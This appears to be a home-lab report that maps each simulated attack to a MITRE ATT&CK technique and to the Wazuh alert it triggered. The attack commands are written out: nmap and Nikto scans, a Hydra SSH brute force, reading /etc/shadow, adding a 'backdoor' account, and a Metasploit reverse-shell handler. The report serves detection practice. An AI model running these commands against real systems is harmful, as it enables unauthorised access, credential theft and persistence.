# Attack Scenarios

## Overview
All attacks were executed from Kali Linux (192.168.244.11) against both the on-premise Ubuntu target (192.168.244.4) and the AWS EC2 instance (98.84.50.190). Every attack maps to a MITRE ATT&CK technique and was detected by Wazuh in real time.

---

## Phase 1 — On-Premise Attacks

### 1. Port Scan — T1046 Network Service Discovery
**Tool:** Nmap
**Command:**
nmap -A -sV -p- 192.168.244.4
**What it does:** Discovers open ports, running services, and OS information on the target.
**Wazuh detection:** Rule 100002 fires after 10 connection attempts within 60 seconds. Tagged T1046 Discovery.
**Screenshot:** screenshots/rule-100002-port-scan-t1046.png

---

### 2. SSH Brute Force — T1110.001 Brute Force Password Guessing
**Tool:** Hydra
**Command:**
hydra -l intern -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.4 -t 4
**What it does:** Attempts thousands of passwords against the SSH service using the rockyou wordlist.
**Wazuh detection:** Rule 100001 fires after 5 SSH failures within 120 seconds at level 12. Tagged T1110.001 Credential Access. Generated 253 alerts.
**Screenshot:** screenshots/ssh-bruteforce-alert-wazuh.png

---

### 3. Packet Capture — T1040 Network Sniffing
**Tool:** Wireshark
**Command:**
sudo wireshark
Filter: tcp.port == 22 during SSH brute force
Filter: http during Nikto web scan
**What it does:** Captures raw network packets at the wire level showing the exact traffic generated by each attack.
**Result:** 756 packets captured during SSH brute force showing SSHv2 handshakes and TCP connections flooding port 22. 16,581 packets captured during Nikto showing HTTP requests hammering Apache.
**Screenshot:** screenshots/wireshark-ssh-bruteforce.png, screenshots/wireshark-nikto-webscan.png

---

### 4. Web Enumeration — T1595 Active Scanning
**Tool:** Nikto
**Command:**
nikto -h http://192.168.244.4
**What it does:** Scans the Apache web server for misconfigurations, exposed files, and known vulnerabilities. Sends hundreds of HTTP requests in a short period.
**Wazuh detection:** Rule 100002 fires detecting reconnaissance. Also triggered XSS detection, Shellshock attempt detection, and common web attack alerts. Generated 7,240 alerts.
**Screenshot:** screenshots/nikto-alert-wazuh.png

---

### 5. Privilege Escalation — T1548.003 Sudo and Sudo Caching
**Tool:** Manual
**Commands:**
ssh intern@192.168.244.4
sudo cat /etc/shadow
sudo cat /etc/shadow
sudo cat /etc/shadow
**What it does:** Simulates an attacker attempting to escalate privileges using sudo after gaining initial access.
**Wazuh detection:** Rule 5402 fires tagged T1548.003 Privilege Escalation and Defense Evasion.
**Screenshot:** screenshots/privilege-escalation-alert.png

---

### 6. Backdoor User Creation — T1136.001 Create Local Account
**Tool:** Manual
**Command:**
sudo useradd -m -s /bin/bash backdoor
**What it does:** Creates a new user account to maintain persistent access to the system after initial compromise.
**Wazuh detection:** Rule 100004 fires immediately tagged T1136.001 Persistence at level 8.
**Screenshot:** screenshots/rule-100004-new-user-persistence.png

## Phase 2 — Cloud Attacks

### 7. Port Scan — T1046 Network Service Discovery
**Tool:** Nmap and Metasploit
**Commands:**
nmap -A -sV 98.84.50.190
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 98.84.50.190
set PORTS 1-1000
run
**What it does:** Discovers open ports and services on the EC2 instance. Metasploit found ports 22 and 80 open.
**Wazuh detection:** Alerts fire under the ec2 agent in the Wazuh dashboard.

---

### 8. Web Enumeration — T1595 Active Scanning
**Tool:** Nikto and Dirb
**Commands:**
nikto -h http://98.84.50.190
dirb http://98.84.50.190
**What it does:** Enumerates the Apache web server on EC2 looking for vulnerabilities and hidden directories.
**Wazuh detection:** Web server 400 error codes flood in under the EC2 agent. Alerts visible in Wazuh dashboard alongside on-prem alerts simultaneously.

---

### 9. Exploitation Simulation — T1210 Exploitation of Remote Services
**Tool:** Metasploit and Netcat
**Commands:**
nc -lvp 4444 (on EC2)
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.244.11
set LPORT 4444
run
**What it does:** Simulates post-exploitation access to a compromised EC2 instance using Metasploit's multi/handler and a netcat backdoor.
**Wazuh detection:** Connection activity logged by the EC2 Wazuh agent.
